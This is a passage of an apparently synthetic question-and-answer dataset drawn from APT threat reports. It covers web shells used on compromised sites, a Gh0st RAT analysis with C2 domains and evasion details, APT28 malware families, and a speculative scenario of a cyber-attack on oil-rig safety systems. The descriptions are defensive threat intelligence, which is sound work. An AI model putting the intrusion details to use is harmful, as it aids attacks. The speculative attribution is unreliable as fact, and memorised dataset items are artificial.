website.\nMedium Headline: Infrastructure\nThe compromised websites were used heavily to host artifacts from maldocs to RATs. However, these websites hosted a few other malicious artifacts as well. The artifacts scripts were used as:\nEmailers.\nWeb shells.\nFile uploaders.\nNone of these scripts have been written from scratch or customized heavily by the attackers. This practise is in sync with their RAT deployments \u2014 neither the RAT payloads nor the infrastructure scripts have been modified except their configurations. The actual effort instead is put into social engineering and infecting victims.\nSmall Headline: Administration\nThe attackers utilized two types of management scripts to administer the compromised websites. PHP and Perl-based web shells maintain browser-based access to the sites and perform administrative actions such as file management, process management and viewing file contents. The web shells used are:\nPhpSpy\nb374k 2.7\nOlder b374k web shell\nb374k web shell's login page on the compromised site.\nOlder Perl-based b374k web shell hosted on a compromised site.\nThe attackers also deployed a file uploader utility (created by \"Pakistan Haxors Crew\") to upload files to the sites without having to go through the web shells.\nFile uploader.\nBig Headline: Conclusion\nThis campaign has been ongoing since the end of 2020 and continues to operate today. The attackers initially deployed Netwire and Warzone RATs on the infected endpoints. The use of these RATs benefits an adversary twofold \u2014 it makes attribution difficult and saves the effort to create bespoke implants. Beginning in July 2021, however, we observed the deployment of the file enumerators alongside the RATs. This indicates that the attackers are expanding their malware arsenal to target their victims: military and government personnel in India.\nInfection tactics including government-themed lures, deployment of commodity/commercial RATs and file enumerators and the use of compromised and attacker-owned domains indicates a strong resemblance to SideCopy and Transparent Tribe.\nUnlike many crimeware and APT attacks, this campaign uses relatively simple, straightforward infection chains. The attackers have not developed bespoke malware or infrastructure management scripts to carry out their attacks, but the use of prebaked artifacts doesn't diminish the lethality of these attacks. In fact, ready-made artifacts such as commodity or cracked RATs and mailers allow the attackers to rapidly operationalize new campaigns while focusing on their key tactic: tricking victims into infecting themselves.\nAnswer this question: What types of management scripts did the attackers utilize to administer the compromised websites, and what functionalities did these scripts provide?",
    "output": "The attackers utilized two types of management scripts: PHP and Perl-based web shells. These web shells provided browser-based access to the compromised sites and enabled administrative actions such as file management, process management, and viewing file contents. Specifically, the web shells used included PhpSpy and various versions of the b374k web shell. Additionally, the attackers deployed a file uploader utility created by 'Pakistan Haxors Crew' to upload files to the sites without needing to go through the web shells.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "So, a workable option appeared to be a covert cyber-attack on rigs operating in the gulf which disabled safety measures or created a situation where a blowout would occur. If done correctly, they could easily hide any attribution behind China (who had been actively stealing secrets from oil companies at this time), a non-state hacking group, a sporadic virus, or merely a glitch/accident. Because of the high stakes involved in any attribution to Russia, the best option would be making it purely appear to be an accident or neglect by BP and its contractors. This could be achieved by playing on known patterns and behaviors by BP that were risky. The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past. This blends seamlessly with the Russian concept of \"Reflexive Control.\"\nTimothy Thomas points out in his book entitled \"Recasting the Red Star\" the concept of reflexive control\u2014as Timothy puts it: \"Reflexive control is defined as a means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action.\"82 Purposefully setting false alarms off in the early hours of the morning so that someone will disable them would be a good example of this. Russian hackers such as the GLEG group have demonstrated proficiency in finding exploits in ICS software by releasing the Agora SCADA+ exploit kit which had a plethora of zero-day exploits in it.83 This demonstrative proficiency, combined with the previously noted 2009 Mario Azar incident would suggest that the technical capability to set this in motion was readily available. After identifying several targets in the GoM, Russian operators could easily have exploited a multitude of attack vectors. Employee's personal systems (which could have VPN access to onshore control stations or the rig directly), mobile devices like smart-phones, portable storage devices such as usb drives, engineer laptops, or an onshore control center with access to the rigs could have been leveraged to gain access. Such attacks could be trivially done even with open-source or free tools such as the iconic Metasploit Framework. Metasploit's custom payload, Meterpreter, for example is capable of residing purely in volatile memory, often leaving few residual traces on persistent storage, if any. After identifying an entry point such as social engineering (perhaps too high profile) or more likely exploitation, Russian operatives could find a series of servers at the onshore control center with a long up-time or that were not regularly updated (and therefore not regularly restarted). The attackers could have leveraged these to create redundant avenues of access which run entirely in volatile memory, thus leaving minimal to no permanent traces. More likely and stable however would be the use of such exploitation to install a persistent backdoor. From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area. It is likely that the same attack vector would not have been used in every instance to obscure any pattern analysis and diversify opportunities for success. At this point setting off alarms in the early hours to encourage employees to disable them, impairing other safety systems and causing general instability would have been enough to subtly magnify the effects beyond a manageable level resulting in catastrophe.\nAfter having discussed in some detail the possibility of a state actor's involvement, it must equally be considered that there is also plenty of evidence suggesting that this was nothing more than a tragic incident. It may also be stated that there is evidence contrary to the posed scenario. The Deepwater horizon incident and the 2008 Caspian Sea incident before it were merely two incidents in an industry fraught with others. Additionally, two incidents\u2014regardless of simi-larity\u2014are not conclusive enough to represent a pattern. Should they be a part of a larger pattern, it is far more likely that these particular incidents pointed to a pattern of corporate neglect than anything else. The inherently dangerous nature of oil refinery work would imply that accidents and loss of life are an unfortunate reality of the industry. According to the Centers for Disease Control and Prevention, \"The fatality rate for oil and gas workers in the U.S. between 2002 and 2007 was more than 29 deaths per 100,000 workers, or about seven times the average for all occupations.\"84 BP is no stranger to such hazards. Deepwater Horizon, though perhaps their worst to date, was not their first prolific disaster. BP was required to pay 1.6 billion dollars in victim compensation for the Texas City refinery explosion from March 23, 2005. They were also required to pay 50.6 million dollars in fines for failing to fix the safety violations that were brought\n82 Recasting the Red Star\n83 https://ics-cert.us-cert.gov/pdf/ICSA-11-096-01.pdf\n84 Centers for Disease Control. (2013, March, 3). Retrieved from http://www.cdc.gov/niosh/programs/oil-gas/risks.html\nto them by OSHA before the explosion.85 These same corporate failings were present in the Deepwater Horizon incident and were brought up during the senate hearings. This in part serves to highlight the fact that even if the incident were to be a state-sponsored attack, the impact of the loss of a single rig or small well is relatively inconsequential to the overall oil production of the victim. The timeline of the Deepwater Horizon incident also speaks volumes \u2013 the incident took place over the course of at least a year and was the product of many budget-saving decisions that were acknowledged to be dangerous by the engineers who were working on the Macondo well drilling effort. These measures and a culture of risk are likely what ultimately sealed the fate of the Deepwater Horizon. These occurrences are too intricate whilst spread over such an extended period of time for any one entity to have reasonably controlled them all.\nIt is within human nature to look for a pattern or design for an event even when there isn't any \u2013 this can be augmented by time as more possible \"clues\" become apparent. For this reason such attribution which seeks out a conclusion is a slippery slope and must be approached with caution\u2014it has a tendency to entice analysts to find facts to fit the hypothesis as opposed to a hypothesis which fits the facts. It's important to remember that correlation does not equal causation; in fact correlation may be coincidental or the result of another unanticipated factor. Likewise the circumstantial evidence alone is not conclusive. Between 1969 and 2005 there have been over 30 separate incidents on oil rigs ranging from fires and explosions, to structural failures, some of which were blowouts not unlike the one that occurred on Deepwater Horizon. It is likely that circumstantial information about one or more of these could be strung together to provide a reasonably convincing political 'attribution.'\nRegardless of the attribution or refutation of an attack, the takeaway from the Deepwater Horizon analysis is that the oil industry is undeniably tied to the cyber domain and an attack on this sector is conceivable; that by using currently available cyber means a kinetic, violent, and instrumental outcome could very possibly be affected on a private sector by a foreign state actor or other human-based agent to gain a favorable outcome.\n85  BBC News, BP agrees to pay record 50.6m fine for Texas explosion. (2010, August, 12) http://www.bbc. co.uk/news/business-10960486\n\nWhat specific technical capabilities did Russian hackers demonstrate that could have been utilized in a cyber-attack on oil rigs, and how might they have executed such an attack?",
    "output": "Russian hackers, such as the GLEG group, demonstrated proficiency in finding exploits in ICS software by releasing the Agora SCADA+ exploit kit, which contained numerous zero-day exploits. This technical capability, combined with previous incidents like the 2009 Mario Azar incident, indicates that they had the means to execute a sophisticated attack. They could have gained access through various vectors, including employee personal systems, mobile devices, USB drives, or onshore control centers. Using tools like the Metasploit Framework, they could have installed persistent backdoors and escalated privileges to access safety systems, ultimately causing instability and catastrophic failure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Air Force\nThe People's Liberation Army Air Force (PLAAF) is the third largest air force in the world behind the United States and Russia. The PLAAF employs 250,000 personnel and 1,762 combat aircraft (IISS 2008). The Soviet Union helped found the PLAAF in 1949, providing aircraft in 1951, and production technology and pilot training in 1953. China gained limited air combat experience during the Korean War. In 1956 China began assembling its own aircraft based on Soviet design, such as the J-2, J-5, and J-6, copies of the MiG-15, Mig-17, and Mig-19 respectively. The Sino-Soviet split was a significant setback to the PLAAF as was resource competition with the missile and nuclear divisions of the military. China's aircraft industry received a boost during the Vietnam War by providing aircraft for North Vietnam.\nDuring the 1980s, the PLAAF underwent significant restructuring, opting for a more streamlined force and increased training. Due to the Sino-Soviet Split, the PLAAF turned to Western states for military expertise. Western states saw China as a counterbalance to the Soviet Union; however support dissolved following the 1989 Tiananmen Square incident.  Reverse engineering of Soviet weaponry continued with the Chinese aircraft F-7 being an illegitimate copy of the MiG-21, and the F-8 incorporating various Soviet designs.  Gorbachev's 1989 visit to China marked an end to the Sino-Soviet split. The newborn and economically struggling state of Russia used the transfer of military technology and expertise to China as a way to sustain its own aerospace industry (Moore 2000).\nThe collapse of The Soviet Union, and concerns over a Taiwan conflict that could draw in the United States, reinvigorated the PLAAF's modernization program. In the 1990s, China began development of fourth generation fighters, including the J-10 and a collaboration with Pakistan on the JF-17. China continued focusing on improved pilot training and retiring obsolete aircraft, preferring quality over quantity. The PLAAF is currently developing its own fifth generation stealth craft and increasing Command, Control, Communications, Computers, Intelligence, Surveillance and Reconnaissance (C4ISR) systems for all its fighters.\nIn addition to jet fighter aircraft, \"China is upgrading its B-6 bomber fleet (originally adapted from the Russian Tu-16) with a new variant which, when operational, will be armed with a new long-range cruise missile\" (Annual Report to Congress 2008). China is also developing Airborne Early Warning and Control (AEW&C) aircraft utilizing Russian and possibly Israeli technology; and is making progress in tanker aircraft used for in-flight refuelling and airlift planes. These are important steps in obtaining the capability to conduct operations beyond China's borders (China's National Defense in 2006; Allen 2005).\nProduction of indigenous Chinese aircraft has been lacklustre. Most of the designs require foreign expertise which is then reverse engineered. The technology obtained is often one generation old at the time of acquisition, as states do not want to give up their advantage. Further, to reverse engineer they not only need the aircraft itself, but also high-precision and technologically advanced machine tools, electronics and components, skilled personnel, and facilities. By the time the technology is fully understood, and indigenous versions produced, the aircraft may be two or three generations behind the latest models of the world's advanced military forces. China is not alone in this difficulty. Except for the five largest industrial arms producers (France, Germany, Russia, the UK, and the US), other countries that have attempted to produce indigenously designed combat aircraft, such as Israel, South Africa, India, Taiwan, and South Korea, have abandoned their efforts and returned to importing systems from one of the five main producers. One reason is the economy of scale involved with financing research, development, and production of all of the systems and sub-systems that compose modern combat aircraft (Moore 2000; see also Allen, Krumel and Pollack 1995). Despite these difficulties, China remains committed to producing indigenous aircraft. Continued purchase of foreign technology demonstrates that the Chinese believe reverse engineering and then upgrading is the best approach to establish themselves as a self-sufficient producer in the future. In other words, the PRC aspires to become one of the elite weapons producers, but it does not want to wait for the infrastructure to evolve; it wants to leapfrog these capabilities.\nMedium Headline: Space\nThe PLA is responsible for the Chinese space program. China was the fifth nation in the world to place a satellite in orbit, the third nation to put a human into space, and the third nation to successfully test an anti-satellite weapon (ASAT) capable of destroying an enemy satellite in low earth orbit. China's manned space activities have received substantial support from Russia. This can be seen in the design of the Shenzhou spacecraft, which closely resembles the Russian Soyuz spacecraft. Although China's commercial space program has utility for non-military research, it also demonstrates space launch and control capabilities that have direct military application. All taikonauts have been selected from members of the PLAAF, and the PLA has deployed space-based systems for military purposes. These include imagery intelligence satellite systems such as the ZiYan series and JianBing series, synthetic aperture satellites (SAR) such as JianBing-5, the BeiDou satellite navigation network, and secured communication satellites such as FengHuo-1. China launched its 100th Long March series rocket in 2007, and continues to put more sophisticated and diverse satellites into orbit. The PRC is developing the Long March 5, an improved heavy-lift rocket that will be able to lift larger reconnaissance satellites into low-earth orbit or communications satellites into geosynchronous orbits by 2012. It expects to replace all foreign-produced satellites in its inventory with indigenously produced sun-synchronous and geo-stationary models by 2010 (Annual Report to Congress 2008; Center for Strategic and International Studies 2003).\nMany of China's space assets are dual use, having financial and prestige benefits in addition to military applications. The Ziyuan-2 series, the Yaogan-1 and -2, the Haiyang-1B, the CBERS-1 and -2 satellites, and the Huanjing satellites, offer ocean surveillance, disaster and environmental monitoring, and high resolution imaging in the visible, infrared, and radar spectrums. New electro-optical satellites are capable of penetrating night and weather with a 1/10 meter resolution, providing near continuous targeting data for the PLA forces. In the arena of navigation and timing, China has five BeiDou satellites with 20 meter accuracy over\nthe region. The PRC also uses the Russian GLONASS navigation system and is a primary investor in the European Union's Galileo navigation system. China has developed small satellite design and production facilities, and is developing microsatellites, satellites which weigh less than 100 kilograms. These satellites offer remote sensing, imagery, and radar, and could allow China to rapidly replace or expand its satellite force in the event of war or a disruption to the network. The country is also improving its ability to track and identify foreign satellites, which is an essential component in the event of counter-space operations. China's successful test of an ASAT weapon demonstrates an ability to strike enemy assets in low earth orbit. This acts as a deterrent to conflict and demonstrates the PRC's commitment to relatively low-cost asymmetric warfare (International Assessment and Strategy Center 2005).\n\nWhat are the key technological advancements and strategies employed by the PLAAF to enhance its C4ISR systems and overall operational capabilities beyond China's borders?",
    "output": "The PLAAF is currently developing its own fifth-generation stealth craft and enhancing its Command, Control, Communications, Computers, Intelligence, Surveillance, and Reconnaissance (C4ISR) systems for all its fighters. Additionally, China is upgrading its B-6 bomber fleet with a new variant equipped with long-range cruise missiles. The PLAAF is also developing Airborne Early Warning and Control (AEW&C) aircraft using Russian and possibly Israeli technology, as well as tanker aircraft for in-flight refueling and airlift planes. These advancements are crucial for conducting operations beyond China's borders, demonstrating a commitment to modernizing and expanding its capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do Advanced Persistent Threats (APTs) like the Syrian Electronic Army (SEA) use Trojan Horses to compromise their targets, and what are the implications of such attacks?",
    "output": "A Trojan Horse is a type of malware that appears to be benign or useful but actually contains hidden code that violates the intended security policy of the user or system administrator. In the context of APTs like the SEA, Trojan Horses are often used to compromise targets through socially engineered spear-phishing emails. These emails lure opposition activists into opening fraudulent, weaponized, and malicious documents that install remote access tool (RAT) software on the victim's computer. This software can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents, and passwords, which are then sent to a computer address controlled by the SEA for intelligence collection and review. The implications of such attacks are significant, as they can give the attackers access to sensitive information and allow them to target political activists for espionage, intimidation, and arrest. Furthermore, the use of Trojan Horses by APTs like the SEA highlights the importance of robust cybersecurity measures, including employee education and awareness, to prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nRecent events of national significance within the oil & gas Industry have brought to light both the question of defining threat sources and that of plausibly attributing known events to a threat source. The unprecedented rise in cy-ber events begets the question of whether this is incidental to the continued advancement of technology, or suggests an ongoing conflict that may escalate. This report will aggregate relevant events, present criteria for outlining threat origins, and determine the likelihood that the incidents are related. It also seeks to determine whether or not any observed correlation points to a persistent aggressor or simply circumstantial coincidence. The purpose of this analysis is to provide decision-makers with a clearer idea of the current security outlook for the oil and gas industry, and pinpoint what current and future causes for concern appear to be. All events and presented options should be considered cautiously and as empirically as possible; any assumptions that are made will be explicitly stated.\n\nQ: In the context of the APT report '2013-9', how does the rise in cyber events within the oil & gas industry relate to the broader question of whether these events are incidental to technological advancements or indicative of an ongoing conflict? Explain the importance of determining the nature of these events for decision-makers in the industry.",
    "output": "A: The rise in cyber events within the oil & gas industry raises the question of whether these incidents are merely a byproduct of advancing technology or part of a larger, potentially escalating conflict. Determining the nature of these events is crucial for decision-makers because it provides a clearer understanding of the current security outlook. By aggregating relevant events and presenting criteria for outlining threat origins, the report aims to determine if these incidents are related and if they point to a persistent aggressor or simply circumstantial coincidence. This analysis helps decision-makers identify current and future causes for concern, enabling them to make more informed decisions about security measures and strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: e5ea0c7a48967202f25fc96d91a1a2cb e61b128e97a39fe869cf89be571fe021 e691dc42a002e9f48f69cd33b70d8a15 e7f5a93eb76bab40d4aa088fba115aaf e7f93c894451ef1fdefa81c6b229852c e8664b135b6d681c812aa04ba14a120c e875d971524d45c10cf332ebf7256688 eb0e2d5ebf6f3dbb4510b85c30a9751d eb1dc493f005059c654817d153f7ee74 edbc569b5b5824a53721b71ad325a212 edfcb5ec135c94b77e4b94c2a82863b7 ee3ac02b6ca3d6c9012604d71017058f eebfa7677dedd10edf4aca985f16284c f03594793c06a097e4b1ac7e1d7079b8 f09e2e3a57d336cb65acab2bdd6b9d14 f1bb8a80e23b6c90004d97c7ef2d0454 f2627bf17528011130e5818bfac0afdb f2a405326747245e5db97c60e878660b f34195a2317bf079844bc44c92297cae f36007400f0c85784fd374ad4ed23c6e f362f47eb844f889bafd5a0e92c7cdf0 f3b95dad321a14500154e13cf3fbefe4 f3d302a8c56ea86d429157fde1793210 f50406b902601b005c1908a048489ca2 f50fa07be0222baffff05b23fdfd5b68 f5b65b971509eefa009d032003410faf f77aff1d1c0d94cc96828fb88f3280f3 f7e3b90592c75a6c3c15336d34d97a9e f9e64eba7185c266786857d7f933577b fa3f412be4ebf45f478135221365dda7 fa7641771280db462f088d8353dbcfbd fb11225f453365af4958f98bde2ce918 fc5364e8274a2eb8310d2528d78ac07e fe4d6a3428cd9f87d5a7044d733d2299 ff271c14549b133a4475ad6615e894da\nAnswer this question: In the context of the Sin Digoo Affair, what are some of the key indicators that suggest the involvement of malware-based espionage activities? How do these indicators help in identifying patterns of Advanced Persistent Threat (APT) activity?",
    "output": "The key indicators that suggest the involvement of malware-based espionage activities in the Sin Digoo Affair include the registration of multiple domains under aliases such as 'Tawnya Grilth' and 'Eric Charles'. These domains were found to be associated with malware samples identified by various automated malware analysis systems and antivirus websites. The repeated appearance of these domains in malware reports indicates a larger pattern of malware-based espionage. This pattern is characteristic of Advanced Persistent Threat (APT) activity, where attackers use sophisticated techniques to gain unauthorized access to sensitive information over an extended period. By analyzing the registration details and the recurring presence of these domains in malware reports, security experts can identify and track the activities of APT groups, helping them to better understand the tactics, techniques, and procedures (TTPs) employed by these threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Gh0st RAT MM523\nFile Size: 21.9 MB\nMD5: bccbba3ed45ead051f56fc62fef005a6\nC2: vpn.mm523.net:10000 (currently sinkholed by RSA Research5)\nhttp://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/zegost\nhttp://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=TrojanDropper:Win32/Zegost.B#tab=2\nRSA Research refers to this variant, or build of Gh0st RAT as \"MM523\" based on the C2 domain. Gh0st is a full function Remote Administration Tool (RAT) with keystroke logger, file manager, remote terminal shell, screen control and capture, and many other functions. Pertinent analysis on Gh0st RAT is available6 .  Since the majority of confirmed Terracotta-compromised systems are running 64-bit Windows Server 2008 R2, this section will detail more findings that are pertinent to that platform, rarely covered by typical sandbox analysis.\nThis particular binary was found on only one system, but appears to be an installer or \"dropper\" for the Gh0st malware that was found on multiple Terracotta compromised servers prior to February 2015.  This malware is unusually large because it is padded with zeros. The large file size may have been a rudimentary attempt to avoid antivirus or network security systems. To be sure, absent the padding, a binary comparison proves that the sample is identical to the sample submitted to VirusTotal in July 2014 with MD5 of e421d07c316ab6e04fd0bfa122f1d953. 7\nGh0st was coded originally for Windows XP. Though the dropper will successfully install on more modern Windows systems, there are unresolved issues with its installation on Windows 7 and Windows Server 2008R2.\nThe dropper scans the Windows registry here:\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\Netsvcs\nIt finds the first unused (stopped and disabled) service that runs under service process svchost netsvcs. On typical Terracotta victim servers, this has been the FastUserSwitchingCompatibility service, which is a deprecated service left-over from Windows XP for compatibility. Since FastUserSwitchingCompatibility it is not an actual service that can run on versions later than Windows\nXP, Microsoft has omitted the service description text. So the Gh0st dropper scans to the next description, and artifacts arising from that issue include a misspelled and mismatched description for the hijacked FastUserSwitchingCompatibility which is \"Windows Sxitcway Firewall/Internet Connection Sharing (ICS)\". A Google search for the word \"Sxitcway\" will reveal other malware that encounters similar platform compatibility problems.\n4 https://www.virustotal.com/en/file/9b8257000b05116a3631630c44b9f6b18c13e5bc5635c1fa3f20a01f70380909/analysis/\n5 A sinkholed domain is one that was used by its owner specifically for malicious activity and thus subject to lawful seizure. Malware that is sinkholed is redirected to an analysis system controlled by researchers or law enforcement instead of the criminals. The sinkhole is then used for intelligence research and victim notification.\n6 http://www.mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf\n7 https://www.virustotal.com/en/file/3a2d5ce9f5f953f0499773a05f26317f9f6745352031bb8dafbb6aadf0e8e57b/analysis/\nThe dropper installs its service DLL named with five random letters with the following path in the normally hidden ProgramData directory. Example:\nSmall Headline: C:\\ProgramData\\Application Data\\Storm\\update\\%SESSIONNAME%\\hbeya.cc3\nThe Gh0st service DLL binary in this location is approximately 22MB in size, and because the file is generated dynamically, has a unique file hash for each installation.\nUpon initial execution, the Gh0st RAT dropper is extremely busy, querying for some 75 URLs associated with legitimate antivirus vendors; however, no connections are made to these URL for C2. For control, the RAT connects to the IP found with a DNS query to vps.mm523.net on port 10000 using the same connection string as the \"cb1st\" variant of Gh0st analyzed by Norman in \"The Many Faces of Gh0st\" paper here:\nhttp://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf\nRSA Research determined that some 240 systems around the world are infected with this Trojan, including approximately 100 Terracotta VPN nodes.\nGh0st RAT GDS520\nFile Size: 204.5KB\nMD5: possibly 81c08ae40700d863f5dbd35599192962 and/or ef938cd1594b6b44507c6423cd39d5f5\nC2: gds520.com:8086 (Active)\nFollowing the neutralization of the MM523 Gh0st RAT communication with the RSA Research seizure of its C2 domain, RSA Research observed malicious services installed by a dropper variant very similar to the MM523 Gh0st variant on newly compromised Terracotta victims. While similar to the \"Gh0st RAT MM523\" build, this build we dub GDS520 has a different service DLL location and C2 URL. The GDS520 sample had been in the wild before the RSA Research sinkholing of mm523.net, based on the date two dropper variants were uploaded to VirusTotal. Similar to Gh0st RAT MM523, these variants are characterized by DNS lookups to multiple antivirus vendor update URLs, in addition to the C2 URL, gds520.com over port TCP port 8086. The Ghost RAT GDS520 service DLL is named with five random letters and is installed in the following location with the example file name:\nSmall Headline: C:\\ProgramData\\DRM\\%SESSIONNAME%\\vxujx.cc3\nNotably, the dropper deletes itself after successfully installing the RAT service. This is unlike the Gh0st RAT MM523 variant, which did not delete itself. Finally, the two GDS520 Ghost RAT variants found on VirusTotal were built with file properties to resemble a legitimate Microsoft program (Figure 9), and included a digital certificate as one of the executable's resources, which can be displayed in the file properties digital signatures tab (Figure 10). RAT files were appended with a digital signature taken from a legitimate file signed by Kaspersky Lab. Since the signature corresponds to a different file, it appeared as invalid. Any more than cursory review of the dropper executable properties would reveal the invalid signature.  These dropper samples used the exact same Kaspersky certificate described in the article \"Certificate Snatching\u2014ZeuS Copies Kaspersky's Digital Signature\" by TrendMicro.8\n8 http://blog.trendmicro.com/trendlabs-security-intelligence/certificate-snatching-zeus-copies-kasperskys-digital-signature/\nOn one compromised system investigated in May of 2015, forensic artifacts showed the source IP address of the GDS520 installer (Figure 11).\nA cache of the page indicated it was from a type of ephemeral file server known as HTTPFileServer (HFS)9 .  The HFS server cached page showed that the HFS daemon had been up for 4 minutes (Figure 12). Fortunately for the investigation, the ephemeral HFS daemon maintains usage statistics. Out of the 37 files available on the HFS page to the Terracotta actor, the GDS520 Gh0st RAT appeared to be the most commonly downloaded, with 1225 total downloads (Figure 12).\n9 http://www.rejetto.com/hfs/\nThe HFS daemon was running on an IP address from a range assigned to a middle school in Beijing according to Whois information10 .  Virus Total11 12 13 14 reveals that hosts in this IP range have been used, extensively in the first half of 2015, to host malicious tools including the GDS520 Gh0st RAT variant and other exploitation tools found on at least three Terracotta victim systems. Also notable in Figure 12 is the third most-often downloaded tool from the actor's HFS page, named \"Win64.exe15.\" RSA Research found this on one Terracotta victim server, and determined this to be a variant of the Windows privilege escalation exploit tool as described by Crowdstrike in a blog post on Hurricane Panda16 .  RSA Research does not know if the Beijing IP address range was leveraged exclusively by Terracotta operators.\n\nBased on the above text, answer a question. How does the Gh0st RAT MM523 dropper attempt to evade detection, and what are the implications of its large file size?",
    "output": "The Gh0st RAT MM523 dropper attempts to evade detection by being unusually large, padded with zeros. This large file size may have been a rudimentary attempt to avoid antivirus or network security systems. The implication of its large file size is that it could potentially bypass simple heuristic-based detection mechanisms that look for typical file sizes of known malware. However, a binary comparison excluding the padding shows that the sample is identical to a previously known sample, indicating that the padding is a basic obfuscation technique.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Houdini's Magic Reappearance\nBy Anthony Kasza and Esmid Idrizovic\nUnit 42 has observed a new version of Hworm (or Houdini) being used within multiple attacks. This blog outlines technical details of this new Hworm version and documents an attack campaign making use of the backdoor. Of the samples used in this attack, the first we observed were June 2016, while as-of publication we were still seeing attacks as recently as mid-October, suggesting that this is likely an active, ongoing campaign.\nRead the text above and answer this question: Why did Unit 42 consider the new version of Hworm (or Houdini) to be part of an active, ongoing campaign? Explain the timeline and significance of this observation.",
    "output": "Unit 42 considered the new version of Hworm (or Houdini) to be part of an active, ongoing campaign because they observed the first samples of this version in June 2016. As of the publication date of the report, they were still seeing attacks using this version as recently as mid-October. This continuous activity over several months indicated that the campaign was not a one-time event but rather a sustained effort, highlighting the need for ongoing vigilance and monitoring by cybersecurity professionals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OTHER APT28 TARGETS ARE CONSISTENT WITH NATION STATE INTERESTS\nAPT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above. However, we are not profiling all of APT28's targets with the same detail because they are not particularly indicative of a specific sponsor's interests.  They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests.\nOther probable APT28 targets that we have identified:\n\u2022 Norwegian Army (Forsvaret)\n\u2022 Government of Mexico\n\u2022 Chilean Military\n\u2022 Pakistani Navy\n\u2022 U.S. Defense Contractors\n\u2022 European Embassy in Iraq\n\u2022 Special Operations Forces Exhibition (SOFEX) in Jordan\n\u2022 Defense Attaches in East Asia\n\u2022 Asia-Pacific Economic Cooperation (APEC)\n\u2022 Al-Wayi News Site\nMedium Headline: OTHER\nOur analysis of some of the group's more commonly used tools indicates that APT28 has been systematically updating their malware since 2007.\nAPT28 MALWARE INDICATES\nSKILLED RUSSIAN DEVELOPERS\nAPT28's tools are suggestive of the group's skills, ambitions, and identity. Our analysis of some of the group's more commonly used tools indicates that APT28 has been systematically updating their tools since 2007.  APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility, who make an effort to obfuscate their activity. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely a nation state government. APT28's malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours, which suggests that the Russian government is APT28's sponsor.\nSome of APT28's more commonly used tools are the SOURFACE downloader, its second stage backdoor EVILTOSS, and a modular family of implants that we call CHOPSTICK.\n\u2022 SOURFACE: This downloader is typically called Sofacy within the cyber security community.  However because we have observed the name \"Sofacy\" used to refer to APT28 malware generally (to include the SOURFACE dropper, EVILTOSS, CHOPSTICK, and the credential harvester OLDBAIT), we are using the name SOURFACE to precisely refer to a specific downloader. This downloader obtains a second-stage backdoor from a C2 server. CORESHELL is an updated version of SOURFACE.\n\u2022 EVILTOSS: This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance, monitoring, credential theft, and shellcode execution.\n\u2022 CHOPSTICK: This is a modular implant compiled from a software framework that provides tailored functionality and flexibility.\nA number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers. The modularity of CHOPSTICK alone, with its flexible and lasting platform, demonstrates planning for long-term use and versatility. We have also noted that APT28 tailors implants to their target environments, configuring them to use local network resources such as email servers.\nAPT28 has attempted to obfuscate their code and implement counter-analysis techniques:\n\u2022 One of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions. This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly.\n\u2022 A number of CORESHELL droppers also conduct runtime checks, attempting to determine if they are executing in an analysis environment, and if so, they do not trigger their payloads.\n\u2022 Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS\nmalware families obfuscate strings that are decoded at runtime.  Two of the malware families (SOURFACE/CORESHELL and EVILTOSS) use the same decryption sequence and similar algorithms for string encoding and decoding. These families encode their strings at compile time using a custom stream cipher. From a high level, these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations.\n\u2022 APT28 has employed RSA encryption to protect files and stolen information moved from the victim's network to the controller.\nAPT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007.  These changes indicate a long-standing and dedicated development effort behind APT28. We have observed samples of the SOURFACE downloader compiled between 2007 and 2014.  We call SOURFACE (samples are frequently named netids.dll) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server.  Until 2013, the SOURFACE downloader used hard-coded IP addresses for C2 communications, whereas the future CORESHELL samples use domains.\nMedium Headline: WHAT IS A MALWARE ECOSYSTEM?\nFirst, a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.\nA malware ecosystem is a group of malware families that work together to perform the same objective.  Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together. They may not share the same code structure, but they are related because one drops and installs the other.\nThe ecosystem surrounding the SOURFACE downloader frequently consists of a dropper, which installs SOURFACE. The SOURFACE downloader then receives another dropper from its C2 server, and this second dropper installs a second stage backdoor, which is usually EVILTOSS.\nIn April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. They started by changing the compiled DLL name 